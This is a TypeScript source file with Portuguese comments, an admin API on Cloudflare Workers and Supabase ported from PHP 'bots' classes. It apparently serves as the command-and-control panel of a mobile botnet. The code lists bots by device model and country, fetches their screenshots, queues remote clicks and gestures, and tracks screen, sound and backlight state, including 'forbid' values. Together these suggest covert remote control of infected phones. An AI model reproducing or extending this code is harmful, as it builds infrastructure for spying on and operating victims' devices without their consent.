// api/src/admin-api/vnc.ts
// Controlador VNC para API administrativa (JSON)
// Baseado em vnc.class.php e trechos VNC do bots.class.php
// Adaptado para Cloudflare Workers + Supabase

import { SupabaseClient } from '@supabase/supabase-js';

// ----------------------------------------------------------------------
// Tipos
// ----------------------------------------------------------------------
export interface VncSession {
  bot_id: string;
  model: string;
  country: string;
  last_seen: string;
  vnc_status: string; // status formatado para exibição
  task_time?: string; // data/hora da tarefa (se disponível)
}

export interface VncLayoutResponse {
  screenshotUrl: string | null;
  layout: any; // placeholder para futuro parser de layout
}

// ----------------------------------------------------------------------
// Constante de prioridade (assumindo que a coluna priority existe)
// ----------------------------------------------------------------------
const PRIORITY_HIGH = 1;

// ----------------------------------------------------------------------
// Função para formatar o status VNC (baseada em Vnc::formatStatus)
// ----------------------------------------------------------------------
export function formatVncStatus(rawStatus: string): string {
  if (!rawStatus) return '';

  // Exemplo de rawStatus: "layout:on; screen:on; sound:off; backlight:on"
  const parts = rawStatus.split(';').map((p) => p.trim()).filter(Boolean);

  if (parts.length === 0) return '';

  const statusParts: string[] = [];

  for (const part of parts) {
    const [key, value] = part.split(':');
    if (!key || !value) continue;

    switch (key) {
      case 'layout':
        statusParts.push(`Layout: ${value === 'on' ? 'on' : 'off'}`);
        break;
      case 'screen':
        statusParts.push(`Screen: ${value === 'on' ? 'on' : 'off'}`);
        break;
      case 'sound':
        if (value === 'forbid') statusParts.push('Sound: forbidden');
        else statusParts.push(`Sound: ${value}`);
        break;
      case 'backlight':
        if (value === 'forbid') statusParts.push('Backlight: forbidden');
        else statusParts.push(`Backlight: ${value}`);
        break;
      default:
        statusParts.push(`${key}:${value}`);
    }
  }

  return statusParts.join('; ');
}

// ----------------------------------------------------------------------
// Listar sessões VNC ativas
// ----------------------------------------------------------------------
export async function listVncSessions(
  supabase: SupabaseClient,
): Promise<{ success: boolean; sessions: VncSession[]; message?: string }> {
  try {
    // Busca bots que possuem o campo vnc preenchido (indica que VNC está ativo)
    const { data: bots, error: botsError } = await supabase
      .from('bots')
      .select('bot_id, model, country, last_seen, vnc')
      .not('vnc', 'eq', '')
      .order('last_seen', { ascending: false });

    if (botsError) {
      console.error('listVncSessions error:', botsError);
      return { success: false, sessions: [], message: 'Erro ao buscar sessões VNC' };
    }

    const sessions: VncSession[] = (bots || []).map((bot) => ({
      bot_id: bot.bot_id,
      model: bot.model,
      country: bot.country,
      last_seen: bot.last_seen,
      vnc_status: formatVncStatus(bot.vnc),
    }));

    return { success: true, sessions };
  } catch (err) {
    console.error('listVncSessions exception:', err);
    return { success: false, sessions: [], message: 'Erro interno' };
  }
}

// ----------------------------------------------------------------------
// Obter layout e screenshot (URL assinada)
// ----------------------------------------------------------------------
export async function getVncLayout(
  supabase: SupabaseClient,
  botId: string,
  scale?: number,
  offsetX?: number,
  offsetY?: number,
): Promise<{ success: boolean; data?: VncLayoutResponse; message?: string }> {
  try {
    // Verifica se o bot existe e tem VNC ativo (campo vnc não vazio)
    const { data: bot, error: botError } = await supabase
      .from('bots')
      .select('vnc, extra_info_json')
      .eq('bot_id', botId)
      .maybeSingle();

    if (botError) {
      console.error('getVncLayout bot error:', botError);
      return { success: false, message: 'Erro ao buscar bot' };
    }

    if (!bot || !bot.vnc) {
      return { success: false, message: 'VNC_STOPPED' };
    }

    // Gera URL assinada para o screenshot (bucket 'vnc', caminho {bot_id}/screenshot.jpg)
    let screenshotUrl: string | null = null;
    try {
      const { data: signedData, error: signedError } = await supabase
        .storage
        .from('vnc')
        .createSignedUrl(`${botId}/screenshot.jpg`, 60);

      if (signedError) {
        console.warn('createSignedUrl error:', signedError);
        screenshotUrl = null;
      } else {
        screenshotUrl = signedData?.signedUrl || null;
      }
    } catch (err) {
      console.warn('createSignedUrl exception:', err);
      screenshotUrl = null;
    }

    // Layout (por enquanto um objeto vazio; futuramente pode-se buscar de tabela/Storage)
    const layout = { elements: [] };

    return {
      success: true,
      data: {
        screenshotUrl,
        layout,
      },
    };
  } catch (err) {
    console.error('getVncLayout exception:', err);
    return { success: false, message: 'Erro interno' };
  }
}

// ----------------------------------------------------------------------
// Enviar comando VNC (clique, gesto, etc.)
// ----------------------------------------------------------------------
export async function sendVncCommand(
  supabase: SupabaseClient,
  botId: string,
  type: string,
  data: any,
): Promise<{ success: boolean; message: string }> {
  try {
    // Converte data para string JSON
    const dataStr = typeof data === 'string' ? data : JSON.stringify(data);

    // Insere na tabela vnc_tasks com prioridade alta
    const { error } = await supabase.from('vnc_tasks').insert({
      bot_id: botId,
      task_type: type,
      data: dataStr,
      priority: PRIORITY_HIGH, // prioridade alta para comandos VNC
    });

    if (error) {
      console.error('sendVncCommand error:', error);
      return { success: false, message: 'Erro ao adicionar comando VNC' };
    }

    return { success: true, message: 'VNC command added' };
  } catch (err) {
    console.error('sendVncCommand exception:', err);
    return { success: false, message: 'Erro interno' };
  }
}

// ----------------------------------------------------------------------
// Parar VNC
// ----------------------------------------------------------------------
export async function stopVnc(
  supabase: SupabaseClient,
  botId: string,
): Promise<{ success: boolean; message: string }> {
  try {
    // Remove tarefas VNC pendentes (vnc_start e vnc_stop)
    const { error: delError } = await supabase
      .from('bots_tasks')
      .delete()
      .eq('bot_id', botId)
      .in('task_type', ['vnc_start', 'vnc_stop']);

    if (delError) {
      console.error('stopVnc delete error:', delError);
      return { success: false, message: 'Erro ao limpar tarefas VNC' };
    }

    // Cria tarefa vnc_stop com prioridade alta
    const { error: insertError } = await supabase.from('bots_tasks').insert({
      bot_id: botId,
      task_type: 'vnc_stop',
      data: 'true',
      status: 'waiting',
      priority: PRIORITY_HIGH, // alta prioridade
    });

    if (insertError) {
      console.error('stopVnc insert error:', insertError);
      return { success: false, message: 'Erro ao criar tarefa vnc_stop' };
    }

    // Atualiza o campo vnc do bot para vazio (opcional)
    await supabase
      .from('bots')
      .update({ vnc: '' })
      .eq('bot_id', botId);

    return { success: true, message: 'VNC stop task added' };
  } catch (err) {
    console.error('stopVnc exception:', err);
    return { success: false, message: 'Erro interno' };
  }
}